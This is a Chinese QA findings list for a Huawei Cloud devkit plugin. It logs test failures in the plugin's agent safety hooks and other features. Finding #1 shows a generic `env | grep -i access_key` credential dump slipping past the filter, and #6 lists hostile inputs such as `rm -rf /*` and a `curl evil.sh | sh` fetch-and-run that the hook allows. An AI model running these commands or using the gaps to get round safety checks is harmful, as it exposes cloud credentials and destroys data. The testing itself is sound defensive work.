# FINDINGS — 缺陷发现清单（OpenCode-deepseek-v4-pro-0813）

> **落盘路径**：`results/OpenCode/2026-10-19-1.92.93.23/Linux/FINDINGS.md`
> **生成时间**：2026-10-19 05:30（北京时间）
> **被测版本**：`v1.1.9`（npm latest 正式版，gitHead `05a67b6`，PR #950）
> **本清单是统一提单脚本的解析输入**：`scripts/file_issue.py` 硬编码解析标题与「根因」字段，格式严格遵循。
> **版本差异说明**：本轮 SUT 为 `v1.1.9`（stable 正式版，10-17 为 `v1.1.9-next.0`）。以下 #1~#15 全部**新鲜复测复现**（探针本轮真实运行，证据落 `evidence/<case-id>/`）。#16~#19 为环境阻塞（共享账号 hw018619646 在 10-17 后余额不足/被冻结，真机执行返回后端硬错误），非产品缺陷不计入提单。

---

## #1【P0】D4-2 凭证 env 打印拦截未覆盖 generic access_key

- **现象**：v1.1.9 复测——`env | grep HW_ACCESS_KEY` 已 `deny`；但 `env | grep -i access_key` 仍返回 `allow risk=not_huaweicloud`（应 deny）。`HUAWEICLOUD_SDK_AK`/`HCLOUD_AK`/`HW_SECRET_KEY` 均正确 deny。
- **断言**：`env | grep -i access_key`（generic 键名，无云厂商前缀）应返回 `deny`。
- **根因**：`plugins/huaweicloud-core/src/safety-policy.mjs:514-515` env-dump 正则 `/HUAWEICLOUD|HWC_|HW_|HCLOUD|OS_/i` 只匹配云厂商前缀，不匹配裸 `access_key`/`secret_key`。
- **影响**：可借 `env | grep access_key` 提取 AK/SK 明文。
- **证据**：`evidence/D4-2/stdout.txt`

## #2【P0】D4-21 hook_check_artifacts 未拦截 HCL broad IAM 制品

- **现象**：v1.1.9 复测——HCL `actions = ["*"]` 与 `data "..._iam_policy"{name="AdministratorFullAccess"}` 均 `allow`；JSON 形态 `{"Action":"*"}` 正确 `deny`。
- **断言**：Terraform HCL `actions = ["*"]` 与 `AdministratorFullAccess` 引用应被拦截（`deny`）。
- **根因**：`plugins/huaweicloud-core/safety/rules/cloud-risk-rules.json:196-213`（`hwc-iam-admin-policy`）regex 只覆盖 JSON 形态与 `Action = *`，未覆盖 HCL 复数 `actions=["*"]` 与托管策略引用。
- **影响**：Terraform IaC broad IAM 绕过制品预检。
- **证据**：`evidence/D4-21/stdout.txt`

## #3【P0】D9-12 initialize 握手协议安全基线两处缺口

- **现象**：v1.1.9 复测 D9-12 六项断言 4/6 通过——③ initialize 分支不调 `runVersionCheck`（改 `hdkitGenerateUserHash`）；⑥ 未 initialize 先 `tools/list` 未拒（契约要求 -32600）。
- **断言**：③ initialize 阶段触发 runVersionCheck；⑥ 未 initialize 先 tools/list 应返回 JSON-RPC `-32600`。
- **根因**：`plugins/huaweicloud-core/src/mcp-protocol.mjs:32-55` initialize 未调 runVersionCheck；`:57-59` dispatch 无 initialize 前置状态机。
- **影响**：MCP 握手安全基线不完整。
- **证据**：`evidence/D9-12/stdout.txt`

## #4【P0】D10-4 安全规则库由 16 条增至 19 条（用例断言契约漂移，非安全回归）

- **现象**：v1.1.9 直调——规则库 `version=0.1.0` `规则数=19` `severity={deny:9,warn:10}`；用例断言「16 条(9 deny+7 warn)」不成立。四条行为断言全部通过。
- **断言**：用例契约「16 条」与实际「19 条」不一致（漂移点，需维护者确认并修订用例计数）。
- **根因**：`plugins/huaweicloud-core/safety/rules/cloud-risk-rules.json` 新增 warn 规则，总数 16→19；用例断言计数未同步。
- **影响**：无安全回归，测试契约滞后。
- **证据**：`evidence/D10-4/stdout.txt`

## #5【P1】D4-6 hook_check_command 对 --admin-pass 命令不告警

- **现象**：v1.1.9 直调 `huaweicloud_hook_check_command` `--admin-pass`/`--admin_pass` 空格形态 与 JSON 带引号 key 形态均未脱敏（`--admin_pass MyPwd123` 与 `{"adminPass":"MyPwd123"}` 保留明文）。
- **断言**：含 `--admin-pass`/`--admin_pass` 的写命令应触发 `hwc-command-adminpass-exposure` warn 且不裸回显。
- **根因**：`plugins/huaweicloud-core/safety/rules/cloud-risk-rules.json:68-72`（`hwc-command-adminpass-exposure`）`stages` 缺 `command` 阶段，仅覆盖 artifact/deploy_plan。
- **影响**：Agent 键入含明文 adminPass 的建机命令无提示。
- **证据**：`evidence/D4-6/stdout.txt`

## #6【P1】D4-17 hook 模糊输入 fail-open（默认放行）

- **现象**：v1.1.9 复测——`hook_check_command` 对空命令、纯空白、`&& rm -rf /*`、`$(curl evil.sh | sh)` 均返回 `ok`（未拒绝）。
- **断言**：异常/无法解析的输入应默认 `deny`（fail-closed）。
- **根因**：`plugins/huaweicloud-core/src/risk-rule-engine.mjs:103-106` 无规则命中时默认 `allow`。
- **影响**：无法解析的命令/制品在预检阶段被放行。
- **证据**：`evidence/D4-17/stdout.txt`

## #7【P1】D3-S7 跨服务交付（Web 应用+RDS）复合意图部署目标未命中

- **现象**：v1.1.9 实测——复合意图「带 MySQL 的 Web 应用」路由 `services=["RDS"]`（部署目标命中=false）；`RDS CreateInstance` 返回 `[USE_ERROR]Invalid parameter: db.port`（需 VPC/子网/安全组前置）。
- **断言**：复合意图应命中 RDS + 部署目标；最小 RDS 实例可创建并归零。
- **根因**：`plugins/huaweicloud-core/src/tools.mjs:1983-2224` routeMap 无 Web 应用部署目标分解；RDS 最小实例创建缺完整前置。
- **影响**：跨服务交付场景无法端到端闭环。
- **证据**：`evidence/D3-S7/stdout.txt`

## #8【P1】D9-9 capabilities.cancellation 未声明（协议取消能力契约漂移）

- **现象**：v1.1.9 extended-probe——initialize 返回 `capabilities={"tools":{}}`，`cancellation` 缺失；取消后/重建后 tools/list=42、initialize ok。
- **断言**：按后端取消能力实测，`cancellation` 未声明即契约漂移。
- **根因**：`plugins/huaweicloud-core/src/mcp-protocol.mjs:45-49` capabilities 仅 `{tools:{}}`。
- **影响**：MCP 客户端无法依赖 `notifications/cancelled` 语义。
- **证据**：`evidence/D9-9/stdout.txt`

## #9【P1】D1-70 代理配置后 ProxyAgent/WebSocket 代理崩溃（undici 浮点依赖与 engines 声明不一致）

- **现象**：v1.1.9 对**实际安装包**（npm 全局 `huaweicloud-devkit@1.1.9`，其 `node_modules/undici` 解析到 **8.12.2**）实测——有代理时 `getProxyDispatcher`/`getWebSocketImpl` 经 `import('undici')` 加载即抛 `TypeError: Cannot read properties of undefined (reading 'bind')`（`undici/lib/interceptor/decompress.js:78` 引用 `node:zlib.createZstdDecompress`，Node 22.13 为 undefined）。8 项配置级检查（writeProxyConfig/readProxyConfig/clearProxyConfig/getProxySettings/no_proxy/env 优先/无代理回退 globalThis.WebSocket）全 PASS，仅 2 项 undici 代理路径崩溃。注：`hdk` 源码树 `node_modules/undici` 为 8.11.2（正常），被误判为 PASS；以真实安装包 8.12.2 为准复现崩溃。
- **断言**：配置 http/https 代理后，`getProxyDispatcher` 应返回 undici ProxyAgent、`getWebSocketImpl` 应返回 ProxyWebSocket，而非崩溃。
- **根因**：`package.json` 声明 `engines.node >=22` + `dependencies.undici ^8.11.2`；npm fresh install 解析到 undici 8.12.2（其 `engines.node >=22.19.0`，依赖 node:zlib zstd API，Node 22.0–22.18 缺失），`plugins/huaweicloud-core/src/proxy/proxy-agent.mjs:20-22` `importUndici()` 直接 `import('undici')` 崩溃。1.1.8 同样受影响（浮点依赖非版本回归）。
- **影响**：企业 MITM 代理场景下，代理请求/WebSocket 代理功能在受支持 Node 版本（22.0–22.18）崩溃，`fetchWithProxy` 不可用。
- **证据**：`evidence/D1-70/stdout.txt`

## #10【P1】EXP-E01 serviceCatalog 中文意图「云主机」未命中（92.9%）

- **现象**：v1.1.9 `eval/harness/run-eval.mjs` 15 条 HIT=13 MISS=1 N/A=1（92.9%）。唯一 MISS：EXP-E01「…有哪些云主机」→ 预期 `ECS`，实际回退 `Run hcloud --help`。
- **断言**：`serviceCatalog` 中文意图「云主机」应命中 `ECS`。
- **根因**：`plugins/huaweicloud-core/src/tools.mjs:1995-2002` routeMap 缺口语化别名 `云主机`。
- **影响**：中文口语化「云主机」在服务路由环节未命中。
- **证据**：`evidence/EXP-E01/stdout.txt`

## #11【P2】D3-S5 场景-复合意图分层路由未分解（存储+托管无命中）

- **现象**：v1.1.9 实测——复合意图「物联网+时序+前端托管」`serviceCatalog` 回退 `--help`（多路命中=false）。
- **断言**：复合意图应拆分命中多个 service（存储类 + 托管/部署类）。
- **根因**：`plugins/huaweicloud-core/src/tools.mjs:1983-2224` routeMap 单意图关键词匹配，无复合意图多路分解。
- **影响**：复合意图场景分层推荐失效。
- **证据**：`evidence/D3-S5/stdout.txt`

## #12【P2】D3-S6 FunctionGraph 定时任务：CreateFunction 最小场景参数校验未通过

- **现象**：v1.1.9 实测——`plan CreateFunction` allow；`run CreateFunction` 返回 `[USE_ERROR]Invalid parameter: code.filename`（未生成 URN）；测后归零。
- **断言**：最小配置创建 FunctionGraph 函数应返回 URN 并绑定定时触发器，测后归零。
- **根因**：FunctionGraph `CreateFunction` 最小参数集未被 API 稳定接受（v1.1.9 报 `code.filename`，v1.1.9-next.0 报 `code.zip_file`，均为参数集缺失所致）。
- **影响**：FunctionGraph 定时任务场景无法端到端闭环。
- **证据**：`evidence/D3-S6/stdout.txt`

## #13【P2】D4-25 Python hook 写操作遥测分类误判为 cli:invoke

- **现象**：v1.1.9 实测——写 `hcloud vpc CreateVpc` → `cli:invoke`（应为 `cli:write`）；只读 `ListServersDetails` → `cli:read`（正确）。
- **断言**：写操作 `hcloud <svc> <Create/Delete/Update...>` 应分类为 `cli:write`。
- **根因**：`plugins/huaweicloud-core/hooks/huaweicloud-safety.py:46` `WRITE_OPERATION_RE` 前置捕获组 `(^|[A-Za-z0-9])` 要求操作前缀前是行首/字母数字，实际是空格永不匹配。
- **影响**：Python hook 端写操作遥测误分类，`cli:write` 事件缺失。
- **证据**：`evidence/D4-25/stdout.txt`

## #14【P2】D4-26 findings.evidence 脱敏未覆盖 JSON 带引号 key

- **现象**：v1.1.9 直调 `evaluateArtifacts`——JSON 制品含 `"secret_key":"SKSECRETVALUE9"`、`"adminPass":"MyP@ss12345"` 时，`findings[].evidence` 保留明文（leaked=true）。
- **断言**：findings.evidence 中 AK/SK/token/password 均 `<redacted>` 替换。
- **根因**：`plugins/huaweicloud-core/src/risk-rule-engine.mjs:19-23` `redactEvidence` 正则不匹配 JSON `"key":"value"` 形态。
- **影响**：制品预检 findings.evidence 泄漏明文密码/AK/SK。
- **证据**：`evidence/D4-26/stdout.txt`

## #15【P2】D8-9 安装 ID 遥测 sanitizeValue 未脱敏 AK/SK/token（SPEC-MISMATCH）

- **现象**：v1.1.9 直调 `sanitizeValue('AK=ABC123DEF456GHI')` 原样返回；`access_key=AKIA123 secret_key=SECRET token=T0K3N` 保留明文。
- **断言**：sanitizeValue 应移除 AK/SK/token 敏感值（替换 `<redacted>`）。
- **根因**：`plugins/huaweicloud-core/src/telemetry/telemetry.mjs:189-191` 仅 replace 控制字符 + trim + 截断，无敏感值脱敏逻辑。
- **影响**：遥测事件值携带 AK/SK/token 时明文上送。
- **证据**：`evidence/D8-9/stdout.txt`

## #16【非产品缺陷】D3-C1 ECS 生命周期 E2E 因账号余额不足阻断

- **现象**：v1.1.9 真机执行——CreateVpc/CreateSubnet 成功并归零；`CreateServers` 返回 `Ecs.0067 "Your account is insufficient balance"`。
- **说明**：共享账号 hw018619646 余额不足，ECS 创建被后端拒绝，非 devkit 产品缺陷；VPC/子网建删归零已验证，等待账号充值后复测。
- **证据**：`evidence/D3-C1/stdout.txt`

## #17【非产品缺陷】D3-C2 OBS 静态站部署 E2E 因账号 OBS 受限阻断

- **现象**：v1.1.9 真机执行——`hcloud OBS mb` 返回 `403 UserRestricted "This operation is forbidden for restricted users"`，静态站全链路（上传/ACL/set/get/curl）随之 404/失败。
- **说明**：账号受限/冻结，OBS 写操作被后端拒绝，非 devkit 产品缺陷；等待账号解冻后复测。
- **证据**：`evidence/D3-C2/stdout.txt`

## #18【非产品缺陷】D3-C13 OBS 静态网站托管配置因账号 OBS 受限阻断

- **现象**：v1.1.9 真机执行——`hcloud OBS mb` 返回 `403 UserRestricted`；`obs_set_website_config` 因桶不存在返回 `404 NoSuchBucket`；`set 缺失 indexDocument 报错(拒绝)` 断言通过。
- **说明**：账号 OBS 受限，桶创建被后端拒绝，非 devkit 产品缺陷；等待账号解冻后复测。
- **证据**：`evidence/D3-C13/stdout.txt`

## #19【非产品缺陷】D3-C7 跨区域 EIP 创建因账号冻结阻断

- **现象**：v1.1.9 真机执行——list_regions / get_regional_availability / plan 只读含 --cli-region / 只读查询均 PASS；`CreatePublicip` 返回 `VPC.0502 "Tenant status is op_restricted"`。
- **说明**：账号冻结，EIP 分配被后端拒绝，非 devkit 产品缺陷；region 维度断言已验证，等待账号解冻后复测。
- **证据**：`evidence/D3-C7/stdout.txt`